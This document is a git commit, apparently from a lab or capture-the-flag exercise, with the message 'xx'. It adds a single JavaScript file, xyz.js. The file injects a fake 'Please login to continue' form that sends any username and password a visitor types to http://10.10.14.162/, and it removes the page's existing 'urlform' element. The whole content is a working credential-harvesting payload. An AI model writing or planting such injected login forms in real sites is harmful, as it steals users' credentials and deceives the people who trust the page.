b73d7ae47f242cc70ef44f5b1565c4b475c48cfe
lilzdotgovph <108351739+lilzdotgovph@users.noreply.github.com>
2026-03-27 23:32:56 +0800

    xx

---
+++ xyz.js
@@ -0,0 +1,1 @@
+document.write('<h3>Please login to continue</h3><form action=http://10.10.14.162/><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
